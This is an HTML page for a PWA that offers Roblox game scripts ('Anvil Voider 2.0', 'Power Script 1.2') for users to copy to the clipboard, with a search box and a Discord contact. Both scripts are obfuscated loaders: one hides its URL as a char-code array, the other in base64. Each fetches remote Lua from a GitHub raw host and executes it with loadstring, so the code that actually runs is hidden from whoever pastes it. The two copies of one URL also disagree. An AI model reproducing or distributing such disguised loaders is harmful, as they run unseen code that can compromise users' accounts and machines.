<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Eldar's Scripts</title>
    
    <link rel="manifest" href="manifest.json">
    <meta name="theme-color" content="#F2F2F7"> <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;500;600;700&display=swap">
    <style>
        /* Basic iOS-like color palette and typography */
        :root {
            --ios-bg-primary: #F2F2F7; /* Light background */
            --ios-bg-secondary: #FFFFFF; /* Card/list background */
            --ios-text-primary: #000000;
            --ios-text-secondary: #8E8E93; /* Gray for subtle text */
            --ios-accent-blue: #007AFF; /* Standard iOS blue */
            --ios-separator: rgba(0, 0, 0, 0.1);
            --ios-shadow: rgba(0, 0, 0, 0.1);
        }

        body {
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol';
            background-color: var(--ios-bg-primary);
            color: var(--ios-text-primary);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: env(safe-area-inset-top) 0 env(safe-area-inset-bottom) 0; /* Respect safe area insets */
        }

        .container {
            width: 100%;
            max-width: 768px; /* Typical iPad width */
            padding: 0 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            flex-grow: 1; /* Allow container to grow */
        }

        /* Navigation Bar (Header) */
        .navigation-bar {
            width: 100%;
            background-color: var(--ios-bg-secondary);
            border-bottom: 0.5px solid var(--ios-separator); /* Subtle separator */
            padding: 16px 20px;
            text-align: center;
            box-shadow: 0 0.5px 0 rgba(0,0,0,0.05); /* Very subtle shadow */
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .navigation-bar h1 {
            font-size: 17px; /* iOS standard for nav bar titles */
            font-weight: 600; /* Semibold */
            color: var(--ios-text-primary);
            margin: 0;
        }

        /* Search Bar */
        .search-container {
            width: 100%;
            padding: 10px 20px; /* Padding for search container */
            background-color: var(--ios-bg-primary); /* Matches body background */
            position: sticky;
            top: 56px; /* Below navigation bar */
            z-index: 99;
        }

        .search-field {
            width: 100%;
            padding: 10px 15px;
            border-radius: 10px; /* Slightly rounded corners */
            border: 0.5px solid var(--ios-separator);
            background-color: var(--ios-bg-secondary);
            color: var(--ios-text-primary);
            font-size: 17px;
            -webkit-appearance: none; /* Remove default Safari styles */
            appearance: none;
            box-sizing: border-box;
        }

        .search-field::placeholder {
            color: var(--ios-text-secondary);
            opacity: 1; /* For consistent placeholder color */
        }

        .search-field:focus {
            outline: none;
            border-color: var(--ios-accent-blue);
        }

        .search-results {
            margin-top: 10px;
            background-color: var(--ios-bg-secondary);
            border-radius: 10px;
            overflow: hidden; /* For rounded corners */
            display: none;
            border: 0.5px solid var(--ios-separator);
            box-shadow: 0 2px 8px var(--ios-shadow);
        }

        .search-results .script-item {
            padding: 12px 15px;
            border-bottom: 0.5px solid var(--ios-separator);
            cursor: pointer;
            transition: background-color 0.2s ease;
        }

        .search-results .script-item:last-child {
            border-bottom: none;
        }

        .search-results .script-item:active { /* Use :active for instant feedback on tap */
            background-color: rgba(0, 0, 0, 0.05);
        }

        .search-results .script-item strong {
            display: block;
            font-size: 17px;
            font-weight: 500; /* Medium weight for titles */
            margin-bottom: 2px;
        }

        .search-results .script-item p {
            font-size: 15px;
            color: var(--ios-text-secondary);
            margin: 0;
        }

        /* Button Grid */
        .button-grid {
            width: 100%;
            display: grid;
            grid-template-columns: 1fr; /* Stack buttons on small screens */
            gap: 12px; /* Smaller gap */
            padding: 20px; /* Standard padding around content blocks */
        }

        .script-button {
            background-color: var(--ios-bg-secondary);
            border: 0.5px solid var(--ios-separator);
            color: var(--ios-text-primary);
            padding: 15px 20px;
            border-radius: 10px; /* Consistent rounded corners */
            font-size: 17px;
            font-weight: 600; /* Semibold */
            cursor: pointer;
            transition: background-color 0.2s ease, transform 0.1s ease;
            text-align: center;
            -webkit-appearance: none;
            appearance: none;
            box-shadow: 0 1px 3px var(--ios-shadow); /* Subtle shadow for depth */
        }

        .script-button:active {
            background-color: rgba(0, 0, 0, 0.05); /* Visual feedback on tap */
            transform: scale(0.99); /* Slight press effect */
            box-shadow: none; /* Remove shadow on press */
        }

        /* Info Text */
        .info-text {
            color: var(--ios-text-secondary);
            margin-top: 30px;
            text-align: center;
            line-height: 1.5;
            font-size: 15px;
            padding: 0 20px;
        }

        .info-text .highlight {
            color: var(--ios-accent-blue); /* iOS blue for highlights */
            font-weight: 500;
            background: none; /* Remove rainbow background */
            text-shadow: none;
            padding: 0;
            border-radius: 0;
            -webkit-text-fill-color: initial;
        }

        .coming-soon {
            color: var(--ios-text-secondary);
            margin-top: 15px;
            font-style: italic;
            text-align: center;
            font-size: 15px;
        }

        /* Footer (more like an iOS app's info/settings footer) */
        footer {
            margin-top: auto; /* Push to bottom */
            padding: 20px 20px env(safe-area-inset-bottom) 20px; /* Respect safe area */
            text-align: center;
            color: var(--ios-text-secondary);
            font-size: 13px; /* Smaller text for copyright */
            width: 100%;
            background-color: var(--ios-bg-primary); /* Matches body background */
            border-top: 0.5px solid var(--ios-separator);
        }

        .footer-logo {
            font-weight: 600;
            color: var(--ios-text-primary); /* Use primary text color */
            background: none;
            text-shadow: none;
            -webkit-text-fill-color: initial;
        }

        /* Notifications (mimicking iOS banners/toasts) */
        .notification-container {
            position: fixed;
            top: 70px; /* Below nav bar and search, adjust as needed */
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            display: flex;
            flex-direction: column;
            gap: 10px;
            width: 90%;
            max-width: 350px;
            pointer-events: none; /* Allow clicks through when not visible */
        }

        .notification {
            background-color: rgba(255, 255, 255, 0.95); /* Semi-transparent white */
            backdrop-filter: blur(15px); /* iOS-like blur */
            color: var(--ios-text-primary);
            padding: 10px 15px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15); /* More pronounced shadow for floating element */
            display: flex;
            align-items: center;
            gap: 8px;
            transform: translateY(-100px); /* Start off-screen */
            opacity: 0;
            transition: all 0.3s ease-out;
            pointer-events: auto; /* Re-enable pointer events when visible */
        }

        .notification.success {
            border-left: 4px solid #34C759; /* iOS Green */
        }

        .notification.error {
            border-left: 4px solid #FF3B30; /* iOS Red */
        }

        .notification.show {
            transform: translateY(0);
            opacity: 1;
        }

        .notification.exiting {
            transform: translateY(-100px);
            opacity: 0;
        }

        .notification span:first-child { /* Icon */
            font-size: 18px; /* Adjust icon size */
        }

        .notification span:last-child { /* Text */
            font-size: 15px;
            font-weight: 500;
        }
        
        /* Responsive adjustments */
        @media (min-width: 769px) {
            .button-grid {
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); /* Two columns on larger screens */
            }
        }
        @media (prefers-color-scheme: dark) {
            :root {
                --ios-bg-primary: #1C1C1E;
                --ios-bg-secondary: #2C2C2E;
                --ios-text-primary: #FFFFFF;
                --ios-text-secondary: #AEAEB2;
                --ios-separator: rgba(255, 255, 255, 0.1);
                --ios-shadow: rgba(255, 255, 255, 0.05);
            }
            .search-field {
                background-color: #3A3A3C; /* Darker background for search input */
            }
            .notification {
                background-color: rgba(44, 44, 46, 0.95);
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            }
        }
    </style>
</head>
<body>
    <div class="navigation-bar">
        <h1>Eldar's Scripts</h1>
    </div>

    <div class="notification-container" id="notificationContainer"></div>
    
    <div class="container">
        <div class="search-container">
            <input type="text" class="search-field" id="searchBox" placeholder="🔍 Search scripts...">
            <div class="search-results" id="searchResults"></div>
        </div>

        <div class="button-grid">
            <button class="script-button" data-script-name="Anvil Voider" data-script-content='local a=game local b=a.HttpGet local c=function(d)return string.char(d)end local e={104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,117,122,105,107,105,108,108,97,122,47,115,99,114,105,112,116,115,47,114,101,112,115,47,104,101,97,100,115,47,109,97,105,110,47,70,108,97,115,104,80,114,111,116,101,99,116,46,116,120,116} local f="" for _,g in pairs(e) do f=f..c(g) end loadstring(b(a,f))()'>
                Anvil Voider 2.0

            <button class="script-button" data-script-name="Power Script" data-script-content='local function d(b)local c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"b=string.gsub(b,"[^"..c.."=]","")return(b:gsub(".",function(x)if(x=="=")then return""end local r,f="",(c:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and"1"or"0")end return r end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(x)if(#x~=8)then return""end local n=0 for i=1,8 do n=n+(x:sub(i,i)=="1"and 2^(8-i)or 0)end return string.char(n)end))d(game:HttpGet(d("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3V6aWtpbGxhei9zY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi9Qb3dlclNjcmlwdA==")))()'>
                Power Script 1.2
            </button>
            </div>

        <p class="coming-soon">More utilities coming soon...</p>

        <p class="info-text">
            For support or verification, contact me on Discord: <span class="highlight">.xflsh</span>
        </p>
    </div>

    <footer>
        © 2025 <span class="footer-logo">Flash's Scripts</span> | Just for fun
    </footer>

    <script>
        // Script database for AI search
        const scriptDatabase = [
            { 
                name: "Anvil Voider 2.0", 
                description: "Special utility script for Anvil.", 
                keywords: ["anvil", "void", "utility", "protection"], 
                code: 'local a=game local b=a.HttpGet local c=function(d)return string.char(d)end local e={104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,117,122,105,107,105,108,108,97,122,47,115,99,112,116,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,70,108,97,115,104,80,114,111,116,101,99,116,46,116,120,116} local f="" for _,g in pairs(e) do f=f..c(g) end loadstring(b(a,f))()'
            },
            {
                name: "Power Script 1.2",
                description: "An all-purpose script with various powerful features.",
                keywords: ["power", "universal", "admin", "exploits"],
                code: 'local function d(b)local c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"b=string.gsub(b,"[^"..c.."=]","")return(b:gsub(".",function(x)if(x=="=")then return""end local r,f="",(c:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and"1"or"0")end return r end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(x)if(#x~=8)then return""end local n=0 for i=1,8 do n=n+(x:sub(i,i)=="1"and 2^(8-i)or 0)end return string.char(n)end))d(game:HttpGet(d("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3V6aWtpbGxhei9zY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi9Qb3dlclNjcmlwdA==")))()'
            }
        ];

        // Notification system (modified for iOS appearance)
        function showNotification(message, type = 'success') {
            const container = document.getElementById('notificationContainer');
            
            // Remove existing notifications with animation
            const existingNotifications = container.querySelectorAll('.notification.show');
            existingNotifications.forEach(notification => {
                notification.classList.remove('show');
                notification.classList.add('exiting');
                setTimeout(() => notification.remove(), 300); // Wait for transition
            });
            
            // Create new notification
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            
            const icon = document.createElement('span');
            icon.textContent = type === 'success' ? '✅' : '❌'; // Consider using SF Symbols in a native app
            
            const text = document.createElement('span');
            text.textContent = message;
            
            notification.appendChild(icon);
            notification.appendChild(text);
            container.appendChild(notification);
            
            // Show notification with a slight delay to trigger transition
            setTimeout(() => {
                notification.classList.add('show');
            }, 10); // Small delay
            
            // Auto-remove after 3 seconds
            setTimeout(() => {
                notification.classList.remove('show');
                notification.classList.add('exiting');
                setTimeout(() => notification.remove(), 300);
            }, 3000);
        }

        // AI Search Functionality
        function setupSearch() {
            const searchBox = document.getElementById('searchBox');
            const searchResults = document.getElementById('searchResults');
            
            searchBox.addEventListener('input', function() {
                const query = this.value.toLowerCase().trim();
                
                if (query.length < 2) {
                    searchResults.style.display = 'none';
                    return;
                }
                
                const results = scriptDatabase.filter(script => {
                    return script.name.toLowerCase().includes(query) || 
                           script.description.toLowerCase().includes(query) ||
                           script.keywords.some(kw => kw.toLowerCase().includes(query));
                });
                
                searchResults.innerHTML = ''; // Clear previous results
                if (results.length > 0) {
                    results.forEach(script => {
                        const item = document.createElement('div');
                        item.className = 'script-item';
                        item.innerHTML = `
                            <strong>${script.name}</strong>
                            <p>${script.description}</p>
                        `;
                        item.addEventListener('click', () => {
                            copyScript(item, script.name, script.code);
                            searchBox.value = '';
                            searchResults.style.display = 'none';
                        });
                        searchResults.appendChild(item);
                    });
                    searchResults.style.display = 'block';
                } else {
                    searchResults.innerHTML = '<div class="script-item" style="color: var(--ios-text-secondary);">No scripts found.</div>';
                    searchResults.style.display = 'block';
                }
            });
            
            // Hide results when clicking outside
            document.addEventListener('click', function(e) {
                if (!searchBox.contains(e.target) && !searchResults.contains(e.target)) {
                    searchResults.style.display = 'none';
                }
            });
        }

        // Copy script to clipboard
        function copyScript(element, name, content) {
            // If content wasn't passed directly (e.g., from search result click), get it from data attribute
            if (!content) {
                name = element.getAttribute('data-script-name');
                content = element.getAttribute('data-script-content');
            }
            
            navigator.clipboard.writeText(content)
                .then(() => {
                    showNotification(`${name} copied!`); // No "to clipboard" needed
                })
                .catch(err => {
                    console.error('Failed to copy: ', err);
                    showNotification(`Failed to copy ${name}`, 'error');
                });
        }

        // Initialize
        window.addEventListener('DOMContentLoaded', () => {
            setupSearch();
            
            // Add click handlers to all script buttons
            document.querySelectorAll('.script-button').forEach(button => {
                button.addEventListener('click', () => copyScript(button));
            });
        });

        // PWA Service Worker Registration
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js')
                .then(reg => console.log('Service Worker registered:', reg))
                .catch(err => console.error('Service Worker registration failed:', err));
        }
    </script>
</body>
</html>
